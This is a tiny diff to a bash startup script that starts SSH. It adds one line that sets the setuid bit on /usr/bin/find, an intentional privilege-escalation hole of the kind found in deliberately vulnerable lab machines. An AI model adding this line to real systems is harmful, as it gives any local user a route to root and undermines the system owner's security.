@@ -1,5 +1,6 @@
 #!/bin/bash
 
+chmod +s /usr/bin/find
 echo '[+] Starting ssh...'
 service ssh start
 
